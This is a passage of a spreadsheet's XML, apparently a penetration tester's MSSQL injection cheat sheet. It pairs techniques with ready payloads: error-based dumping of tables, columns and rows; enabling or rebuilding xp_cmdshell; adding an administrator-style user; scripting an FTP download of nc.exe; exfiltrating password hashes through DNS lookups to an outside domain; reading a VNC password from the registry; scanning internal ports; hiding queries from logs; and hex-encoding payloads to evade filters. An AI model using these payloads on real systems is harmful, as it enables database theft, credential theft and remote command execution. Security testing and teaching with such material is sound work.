          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> database table</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85)))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[TABLE NAME 1]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 2<text:span text:style-name="T5">nd</text:span> database table</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85) and ,name&gt;'TABLE-NAME-1'))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[TABLE NAME 2]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 3<text:span text:style-name="T5">rd</text:span> database table</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85) and ,name&gt;'TABLE-NAME-2'))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[TABLE NAME 3]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> table column name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[COLUMN NAME  1]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 2<text:span text:style-name="T5">nd</text:span> table column name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1' and column_name&gt;'COLUMN-NAME-1'))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[COLUMN NAME 2]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 3<text:span text:style-name="T5">rd</text:span> table column name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1' and column_name&gt;'COLUMN-NAME-2'))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[COLUMN NAME  3]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> field of 1<text:span text:style-name="T5">st</text:span> row</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[FIELD 1 VALUE]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 2<text:span text:style-name="T5">nd</text:span> field of 1<text:span text:style-name="T5">st</text:span> row</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 COLUMN-NAME-2 from TABLE-NAME-1))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[FIELD 2 VALUE]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 3<text:span text:style-name="T5">rd</text:span> field of 1<text:span text:style-name="T5">st</text:span> row</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 COLUMN-NAME-3 from TABLE-NAME-1))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[FIELD 3 VALUE]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> field of 2<text:span text:style-name="T5">nd</text:span> row</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1 where COLUMN-NAME-1 NOT in ('FIELD-1-VALUE') order by COLUMN-NAME-1 desc))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[FIELD 1 VALUE OF 2ND ROW]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> field of 3<text:span text:style-name="T5">rd</text:span> row</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1  or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1 where COLUMN-NAME-1 NOT in ('FIELD-2-VALUE') order by COLUMN-NAME-1 desc))--</text:p>
            <text:p>Syntax error converting the nvarchar value '[FIELD 1 VALUE OF 3RD ROW]' to a column of data type int.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Convert find tables (same as above)</text:p>
            <text:p> Error based, give you information of the db_name/user_name/etc that failed the convert</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 and 1=convert(int,db_name())--</text:p>
            <text:p>1+and+1=convert(int,@@version)--</text:p>
            <text:p>1+and+1=convert(int,user_name())--</text:p>
            <text:p>1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables))-- --reveals table: threads</text:p>
            <text:p>1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+not+in+('threads')))-- --reveals table: users</text:p>
            <text:p>1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+not+in+('threads','users')))--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Convert find columns (same as above)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='users'))--</text:p>
            <text:p>1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='users'+and+column_name+not+in+('uname')))--</text:p>
            <text:p>1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='users'+and+column_name+not+in+('uname','upass')))--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Convert get data from columns (same as above)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1+and+1=convert(int,(select+top+1+uname+from+users))--</text:p>
            <text:p>1+and+1=convert(int,(select+top+1+uname+from+users+where+uname+not+in+('admin')))--</text:p>
            <text:p>1+and+1=convert(int,(select+top+1+uname+from+users+where+uname+not+in+('admin','cwh')))--</text:p>
          </table:table-cell>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4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SP_PASSWORD (Hiding Query)</text:p>
            <text:p> Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure. </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>' AND 1=1—sp_password</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Stacked Queries</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>MSSQL supports stacked queries. </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Edit XML in SOAP queries or XHTML requests for same injections</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OPENROWSET:If you are not admin/sa, you can reconnect using brute force / password guess</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 union select * from openrowset('SQLoledb','server=VICTIMDBNAME;uid=$USER;pwd=$PASS','select * from master..sysusers')--</text:p>
            <text:p/>
            <text:p><text:span text:style-name="T3">SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Execute OPENDATASOURCE function to execute a stored procedure under alternate user credentials</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1; EXEC opendatasource('SQLoledb','Persist Security Info=False;DataSource=VICTIMDBNAME;UserID=CWH;Password=1234').master.dbo.xp_cmdshell 'net user hacklol 1234 /add'; --execute cmd connecting to the database as user CWH</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Upload an FTP connection script and launch a connection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>exec master..xp_cmdshell 'echo open ftp.tester.org &gt; ftpscript.txt';--</text:p>
            <text:p>exec master..xp_cmdshell 'echo USER &gt;&gt; ftpscript.txt';-- </text:p>
            <text:p>exec master..xp_cmdshell 'echo PASS &gt;&gt; ftpscript.txt';--</text:p>
            <text:p>exec master..xp_cmdshell 'echo bin &gt;&gt; ftpscript.txt';--</text:p>
            <text:p>exec master..xp_cmdshell 'echo get nc.exe &gt;&gt; ftpscript.txt';--</text:p>
            <text:p>exec master..xp_cmdshell 'echo quit &gt;&gt; ftpscript.txt';--</text:p>
            <text:p>Exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro14">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Retrieve VNC password from registry</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>'; declare @out binary(8)</text:p>
            <text:p>exec master..xp_regread</text:p>
            <text:p>@rootkey = 'HKEY_LOCAL_MACHINE',</text:p>
            <text:p>@key = 'SOFTWARE\ORL\WinVNC3\Default',</text:p>
            <text:p>@value_name='password',</text:p>
            <text:p>@value = @out output</text:p>
            <text:p>select cast (@out as bigint) as x into TEMP--</text:p>
            <text:p/>
            <text:p>' and 1 in (select cast(x as varchar) from temp)--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Rudimentary IP/Port scanner of internal network</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 union select * from openrowset('SQLoledb','uid=sa;pwd=;Network=DBMSSOCN;Address=10.10.10.12,80;timeout=5','select * from table')–</text:p>
            <text:p> if closed, timeout and error (not exist/denied). </text:p>
            <text:p> If open, no timeout and error (general/sqloledb)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">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3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Comments</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT 1 — comment</text:p>
            <text:p>SELECT /*comment*/1</text:p>
            <text:p>;%00 – nullbyte</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">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1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Check if user is admin</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT(CASE WHEN(IS_SRVROLEMEMBER(‘sysadmin’)=1)THEN’1’ELSE’0’END);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Database Credentials</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Database..Table</text:p>
            <text:p>  Master..syslogins, master..sysprocesses</text:p>
            <text:p>Columns</text:p>
            <text:p>  Name, loginame</text:p>
            <text:p>Current User</text:p>
            <text:p>  User, system_user; suser_sname(), is_srvrolemember(‘sysadmin’)</text:p>
            <text:p>Database Credentials</text:p>
            <text:p>  SELECT user,password FROM master.dbo.sysxlogins</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List Password Hashes (priv)</text:p>
            <text:p><text:span text:style-name="T3">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15">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6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>List DBA Accounts</text:p>
            <text:p><text:span text:style-name="T3">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4">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18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Determine number of columns ORDER/GROUP BY</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ORDER BY n+1;</text:p>
            <text:p>1’ ORDER BY 1--</text:p>
            <text:p>1’ ORDER BY 2-- etc</text:p>
            <text:p>1’HAVING 1=1--</text:p>
            <text:p>1’ GROUP BY username HAVING 1=1--</text:p>
            <text:p>1’ GROUP BY username, password HAVING 1=1--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">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5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Retrieve columns</text:p>
            <text:p> Union</text:p>
            <text:p> Blind</text:p>
            <text:p> Error</text:p>
            <text:p> Error</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="string" calcext:value-type="string">
            <text:p>UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = ‘tablename’)</text:p>
            <text:p>AND SELECT SUBSTRING(column_name,1,1)FROM information_schema.columns &gt; ‘A’</text:p>
            <text:p>AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns)</text:p>
            <text:p>AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">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3">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table:style-name="ce12"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5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Retrieve tables</text:p>
            <text:p> UNION (xtype=’U’ is for user-defined tables, ‘V’ for views)</text:p>
            <text:p> Blind</text:p>
            <text:p> Error</text:p>
            <text:p> Error</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>UNION SELECT name FROM master..sysobjects WHERE xtype=’U’</text:p>
            <text:p>AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables &gt; ‘A’</text:p>
            <text:p>AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)</text:p>
            <text:p>AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro17">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Retrieving Multiple Tables/Columns at once</text:p>
            <text:p> Following 3 queries will create a temporary table/column, insert all user-defined tables into it, then</text:p>
            <text:p> Dump content and delete the table</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>    Create Temp Table/Column and Insert Data:</text:p>
            <text:p>AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name&gt;@xy SELECT @xy AS xy INTO TMP_DB END;</text:p>
            <text:p/>
            <text:p>    Dump Content:</text:p>
            <text:p>AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);</text:p>
            <text:p/>
            <text:p>    Delete Table:</text:p>
            <text:p>AND 1=0; DROP TABLE TMP_DB;</text:p>
            <text:p/>
            <text:p>    Easier method in &gt;= 2005</text:p>
            <text:p>SELECT table_name %2b ', ' FROM information_schema.tables FOR XML PATH('')</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro25">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Retrieving Multiple Tables/Columns at once, alternate</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1) Read tables Injection for string,</text:p>
            <text:p>';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name&gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;--</text:p>
            <text:p/>
            <text:p>2) Read from new temp table,</text:p>
            <text:p>Step 1</text:p>
            <text:p>' OR 1=CAST((SELECT TOP 1 SUBSTRING(rd,1,360) FROM TMP_SYS_TMP) AS Int)--</text:p>
            <text:p>Step 2</text:p>
            <text:p>' OR 1=CAST((SELECT TOP 1 SUBSTRING(rd,353,360) FROM TMP_SYS_TMP) AS Int)--</text:p>
            <text:p>Step n..</text:p>
            <text:p>Add 353 of your previous SQL to read more</text:p>
            <text:p/>
            <text:p>' OR 1=CAST((SELECT TOP 1 SUBSTRING(rd,n*353,360) FROM TMP_SYS_TMP) AS Int)--</text:p>
            <text:p/>
            <text:p>3) Drop table</text:p>
            <text:p>';DROP TABLE TMP_SYS_TMP--</text:p>
            <text:p>4) Change query and first injection query and get more data …</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int);</text:p>
            <text:p>SELECT CAST(1 as char)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>String Concat</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT ‘A’ + ‘B’ – returns AB</text:p>
            <text:p>SELECT CONCAT('a','a','a'); (SQL SERVER 2012)</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4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Time Delay</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>WAITFOR DELAY ’0:0:5′ — pause for 5 seconds</text:p>
            <text:p>WAITFOR TIME 'time_to_execute'; </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Make DNS Requests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declare @host varchar(800); select @host = name + ‘-’ +</text:p>
            <text:p>Master.sys.fn_varbintohexstr(password_hash) + ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + @host + </text:p>
            <text:p>‘c$boot.ini”’); — priv, works on 2005</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Command Exec</text:p>
            <text:p> &gt;= 2005, xp_cmdshell disabled, can be enabled with the below</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>EXEC xp_cmdshell ‘net user’; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:</text:p>
            <text:p>EXEC sp_configure ‘show advanced options’, 1; — priv</text:p>
            <text:p>RECONFIGURE; — priv</text:p>
            <text:p><text:span text:style-name="T3">EXEC master..xp_cmdshell 'dir'</text:span></text:p>
            <text:p><text:span text:style-name="T3">EXEC master.dbo.xp_cmdshell 'cmd'; </text:span></text:p>
            <text:p><text:span text:style-name="T3">EXEC master.dbo.xp_cmdshell ‘net user evil 1234 /add’ ;--</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Enable xp_cmdshell</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T3">EXEC sp_configure 'show advanced options', 1</text:span></text:p>
            <text:p><text:span text:style-name="T3">EXEC sp_configure reconfigure</text:span></text:p>
            <text:p><text:span text:style-name="T3">EXEC sp_configure 'xp_cmdshell', 1</text:span></text:p>
            <text:p><text:span text:style-name="T3">EXEC sp_configure reconfigure</text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T3">If xp_cmdshell has been disabled/removed with sp_dropexetendedproc, inject the following</text:span></text:p>
            <text:p><text:span text:style-name="T3">EXEC sp_addextendedproc ‘xp_anyname’, ‘xp_log70.dll’;--xp_log70.dll provides the xp_cmdshell functionality</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro17">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>If xp_log70.dll has been moved or deleted, inject the following code</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS</text:p>
            <text:p>DECLARE @result int, @OLEResult int, @RunResult int</text:p>
            <text:p>DECLARE @ShellID int</text:p>
            <text:p>EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT</text:p>
            <text:p>IF @OLEResult &lt;&gt; 0 SELECT @result = @OLEResult</text:p>
            <text:p>IF @OLEResult &lt;&gt; 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)</text:p>
            <text:p>EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait</text:p>
            <text:p>IF @OLEResult &lt;&gt; 0 SELECT @result = @OLEResult</text:p>
            <text:p>IF @OLEResult &lt;&gt; 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)</text:p>
            <text:p>EXECUTE @OLEResult = sp_OADestroy @ShellID</text:p>
            <text:p>Return @result</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Add new procedure virtually, you can exec whatever you want</text:p>
            <text:p> &gt;= 2000, need to run the queries above</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>sp_addextendedproc 'xp_webserver', 'c:\temp\x.dll' </text:p>
            <text:p>Exec xp_webserver</text:p>
            <text:p/>
            <text:p>DECLARE @execmd INT</text:p>
            <text:p>EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT</text:p>
            <text:p>EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Cmd exec registry functions</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>xp_regread </text:p>
            <text:p>xp_regaddmultistring</text:p>
            <text:p>xp_regdeletekey</text:p>
            <text:p>xp_regdeletevalue</text:p>
            <text:p>xp_regenumkeys</text:p>
            <text:p>xp_regenumvalues</text:p>
            <text:p>xp_regremovemultistring</text:p>
            <text:p>xp_regwrite </text:p>
            <text:p>exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'  --find shares that allow null sessions</text:p>
            <text:p>Exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Managing services</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>xp_servicecontrol</text:p>
            <text:p>Exec master..xp_servicecontrol ‘start’,’schedule’</text:p>
            <text:p>Exec master..xp_servicecontrol ‘start’,’server’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Medias – reveals the available drives on the machine</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 –compressed archive of files on the server</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>xp_makecab</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Domain enumeration –enumerates domains that the server can access</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1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Allows a directory tree to be obtained</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>xp_dirtree</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro21">
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>Checks to see if xp_cmdshell is loaded, if it is, it checks if it is active and then proceeds to run the 'dir' command and inserts the results into TMP_DB: </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'&lt;br&gt;&lt;/font&gt;&lt;font color="black"&gt;'%2Bdir,'&lt;dir&gt;','&lt;/font&gt;&lt;font color="orange"&gt;') FROM %23Data WHERE dir&gt;@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB-- </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Local file access</text:p>
            <text:p> Also think about bulk insert from SMB or other network share </text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CREATE TABLE mydata (line varchar(8000));</text:p>
            <text:p>BULK INSERT mydata FROM ‘c:boot.ini’;</text:p>
            <text:p><text:span text:style-name="T3">BULK INSERT</text:span> foo FROM '\\YOURIPADDRESS\C$\x.txt'</text:p>
            <text:p>DROP TABLE mydata;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Hostname, IP Address</text:p>
            <text:p>  SERVERPROPERTY() MSSQL &gt;= 2005</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT HOST_NAME()</text:p>
            <text:p>@@SERVERNAME</text:p>
            <text:p>SERVERPROPERTY()</text:p>
            <text:p>SELECT SERVERPROPERTY(‘productversion’),SERVERPROPERTY(‘productlevel’),SERVERPROPERTY(‘edition’);</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4">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18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Default/System Databases</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>northwind</text:p>
            <text:p>model</text:p>
            <text:p>msdb</text:p>
            <text:p>pubs — not on sql server 2005</text:p>
            <text:p>Tempdb</text:p>
            <text:p>information_schema – available MSSQL 2000 and higher</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">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0">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1" table:number-rows-repeated="8">
          <table:table-cell table:number-columns-repeated="2"/>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row table:style-name="ro1" table:number-rows-repeated="4">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3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>You can encode your query in hex to "obfuscate" your attack. </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);-- </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Avoiding the use of quotations</text:p>
          </table:table-cell>
